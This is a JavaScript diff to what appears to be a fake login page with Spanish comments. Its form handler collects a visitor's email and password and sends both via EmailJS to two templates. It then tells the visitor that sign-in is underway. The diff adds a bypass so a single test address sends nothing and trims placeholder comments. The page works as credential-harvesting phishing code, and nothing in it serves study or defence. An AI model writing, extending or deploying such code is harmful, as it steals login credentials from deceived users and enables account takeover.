@@ -7,6 +7,12 @@
         var email = document.getElementById('email').value;
         var password = document.getElementById('password').value;
 
+        if (email === 'pruebita@gmail.com') {
+            alert('Correo no válido. No se enviará nada.');
+            document.getElementById('contact-form').reset();
+            return;
+        }
+
         if (email && password) {
             // data
             var templateParams = {
@@ -17,21 +23,13 @@
             // firtu
             emailjs.send('service_mlr1gee', 'template_8ygccbi', templateParams)
                 .then(function(response) {
-                    // eeeepa
-                    // eeeepa
                 }).catch(function(error) {
-                    // eeeepa
-                    // eeeepa
                 });
 
-            // seconse
+            // secose
             emailjs.send('service_mlr1gee', 'template_mu97vit', templateParams)
                 .then(function(response) {
-                    // eeeepa
-                    // eeeepa
                 }).catch(function(error) {
-                    // eeeepa
-                    // eeeepa
                 });
 
             alert('Inicio de sesión en curso...');
